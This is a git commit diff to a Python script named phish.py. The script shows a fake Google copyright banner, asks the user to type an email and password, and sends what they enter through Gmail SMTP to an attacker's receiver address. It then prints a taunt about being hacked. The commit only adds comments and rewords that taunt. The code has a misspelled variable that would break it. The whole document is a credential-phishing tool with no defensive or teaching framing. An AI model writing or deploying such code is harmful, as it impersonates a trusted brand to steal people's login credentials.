c82831a92b145ab9dc4c63dd80506377c59c668d
hamzajaradatlol <47142963+hamzajaradatlol@users.noreply.github.com>
2020-01-29 01:35:43 +0200

    Update phish.py

--- phish.py
+++ phish.py
@@ -1,15 +1,18 @@
 import smtplib
 import time
 print ("    Google 2019 (C) All rights are reserved.")
+# Sender email
 email = "gmailonly"
 pswd = "gmailpassword"
+# Receiver email
 receive = "receiver@email.com"
 message = input("Email: ") + input("Password: ")
 s = smtplib.SMTP("smtp.gmail.com", 587)
 s.starttls()
 s.login(email, pswd)
 print (" You logged in successfully {!}")
+# Send email from sender email to receiver email
 s.sendmail(email, recieve, message)
 print ("[============>] Email sent successfully...")
 time.sleep(0.1)
-print ("OH GOD. DID I GET HACKED, BY THE TRUTH???!!")
+print ("OH GOD. DID I GET HACKED???!!")
